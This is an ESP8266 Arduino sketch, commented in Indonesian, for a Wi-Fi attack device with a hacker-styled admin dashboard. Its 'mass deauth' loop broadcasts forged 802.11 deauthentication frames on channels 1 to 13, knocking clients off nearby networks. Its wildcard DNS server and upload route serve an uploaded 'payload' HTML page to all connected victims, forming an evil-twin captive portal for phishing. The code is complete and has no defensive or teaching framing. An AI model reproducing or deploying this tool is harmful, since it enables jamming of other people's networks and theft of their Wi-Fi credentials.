#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <DNSServer.h>
#include <FS.h> // SDK lama pakai FS.h untuk SPIFFS
#include <Wire.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>

extern "C" { #include "user_interface.h" }

const char* admin_ssid = "GMpro86";
const char* admin_pass = "sangkur87";

Adafruit_SSD1306 display(64, 48, &Wire, -1);
ESP8266WebServer server(80);
DNSServer dnsServer;
File fsUploadFile;

bool massDeauthActive = false;
String scanResultsHTML = "READY TO SCAN...";

// --- UI DASHBOARD ADMIN ---
const char ADMIN_HTML[] PROGMEM = R"rawliteral(
<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1">
<style>
  body{background:#0a0a0a;color:#0f0;font-family:monospace;margin:0;padding-bottom:80px}
  .hdr{border-bottom:1px solid #0f0;padding:15px;text-align:center;font-weight:bold;background:#111}
  .card{background:#111;margin:10px;padding:15px;border:1px solid #333;border-left:4px solid #0f0}
  .btn{border:1px solid #0f0;background:0;color:#0f0;padding:12px;width:100%;margin-top:10px;font-weight:bold;cursor:pointer}
  .btn-red{border-color:#f00;color:#f00}
  .nav{position:fixed;bottom:0;width:100%;background:#111;display:flex;border-top:1px solid #333}
  .item{flex:1;padding:20px;text-align:center;color:#444;font-size:12px;font-weight:bold}
  .active{color:#0f0;background:#1a1a1a;border-top:2px solid #0f0}
</style></head><body>
<div class="hdr">SYSTEM COMMANDER V8.6</div>
<div id="p1" class="container">
  <div class="card" style="border-left-color:#f00">
    <button class="btn btn-red" onclick="location.href='/mode?m=mass'">EXECUTE MASS DEAUTH</button>
    <button class="btn" onclick="location.href='/mode?m=off'">CEASE FIRE</button>
  </div>
  <div class="card">
    <button class="btn" onclick="location.href='/scan'">UPDATE SCANNER</button>
    <div style="margin-top:15px;font-size:11px">%WIFILIST%</div>
  </div>
</div>
<div id="p2" style="display:none">
  <div class="card">
    <form method="POST" action="/upload" enctype="multipart/form-data">
      <input type="file" name="f" accept=".html"><br><br>
      <button class="btn" type="submit">DEPLOY PAYLOAD</button>
    </form>
  </div>
</div>
<div class="nav">
  <div id="t1" class="item active" onclick="show(1)">CONSOLE</div>
  <div id="t2" class="item" onclick="show(2)">STORAGE</div>
</div>
<script>
  function show(n){
    document.getElementById('p1').style.display=n==1?'block':'none';
    document.getElementById('p2').style.display=n==2?'block':'none';
    document.getElementById('t1').className='item '+(n==1?'active':'');
    document.getElementById('t2').className='item '+(n==2?'active':'');
  }
</script></body></html>
)rawliteral";

void setup() {
  SPIFFS.begin(); // Ganti LittleFS ke SPIFFS
  pinMode(2, OUTPUT); digitalWrite(2, HIGH);
  display.begin(SSD1306_SWITCHCAPVCC, 0x3C);
  display.clearDisplay();
  display.setTextColor(WHITE);
  display.setCursor(0,5); display.println(">> V8.6_JOSS");
  display.display();

  WiFi.mode(WIFI_AP_STA);
  WiFi.softAP(admin_ssid, admin_pass);
  dnsServer.start(53, "*", WiFi.softAPIP());

  server.on("/admin", [](){
    String s = ADMIN_HTML;
    s.replace("%WIFILIST%", scanResultsHTML);
    server.send(200, "text/html", s);
  });

  server.on("/scan", [](){
    int n = WiFi.scanNetworks();
    scanResultsHTML = "";
    for (int i = 0; i < n; ++i) {
      scanResultsHTML += "<div>[CH:" + String(WiFi.channel(i)) + "] " + WiFi.SSID(i) + "</div>";
    }
    server.sendHeader("Location", "/admin");
    server.send(303);
  });

  server.on("/mode", [](){
    massDeauthActive = (server.arg("m") == "mass");
    server.sendHeader("Location", "/admin");
    server.send(303);
  });

  server.on("/upload", HTTP_POST, [](){ server.send(200, "text/html", "SUCCESS. <a href='/admin'>RETURN</a>"); }, [](){
    HTTPUpload& upload = server.upload();
    if(upload.status == UPLOAD_FILE_START) fsUploadFile = SPIFFS.open("/index.html", "w");
    else if(upload.status == UPLOAD_FILE_WRITE) if(fsUploadFile) fsUploadFile.write(upload.buf, upload.currentSize);
    else if(upload.status == UPLOAD_FILE_END) if(fsUploadFile) fsUploadFile.close();
  });

  server.onNotFound([](){
    if(SPIFFS.exists("/index.html")){
      File f = SPIFFS.open("/index.html", "r");
      server.streamFile(f, "text/html");
      f.close();
    } else server.send(200, "text/html", "System Updating...");
  });
  server.begin();
}

void loop() {
  dnsServer.processNextRequest();
  server.handleClient();
  if (massDeauthActive) {
    digitalWrite(2, !digitalRead(2));
    uint8_t pkt[26] = {0xc0,0,0x3a,0x01, 0xff,0xff,0xff,0xff,0xff,0xff, 0,0,0,0,0,0, 0,0,0,0,0,0, 0,0,1,0};
    for (int ch=1; ch<=13; ch++) {
      wifi_set_channel(ch);
      for (int i=0; i<15; i++) { wifi_send_pkt_freedom(pkt, 26, 0); delay(1); }
      yield();
    }
  }
}
